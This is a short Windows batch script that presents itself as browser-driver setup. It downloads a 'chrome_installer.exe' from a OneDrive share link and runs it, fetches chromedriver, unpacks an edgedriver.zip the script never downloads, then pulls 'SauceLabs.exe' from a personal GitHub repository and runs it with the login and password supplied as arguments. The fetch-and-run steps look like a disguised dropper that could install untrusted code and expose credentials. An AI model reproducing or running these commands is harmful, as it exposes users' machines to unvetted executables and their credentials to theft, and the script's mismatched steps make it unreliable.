set lg=%1
set psw=%2
powershell Invoke-WebRequest 'https://onedrive.live.com/download?cid=8EC1F4EF6A71319F&resid=8EC1F4EF6A71319F%21106&authkey=ADyjT1DiP_TqZuE' -OutFile "C:\Users\Public\Downloads\chrome_installer.exe"
powershell Invoke-Expression "C:\Users\Public\Downloads\chrome_installer.exe"
powershell Invoke-WebRequest -Uri "https://chromedriver.storage.googleapis.com/110.0.5481.77/chromedriver_win32.zip" -OutFile "C:\Users\Public\Downloads\chromedriver_win32.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\edgedriver.zip -DestinationPath C:\Users\Public\Downloads
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
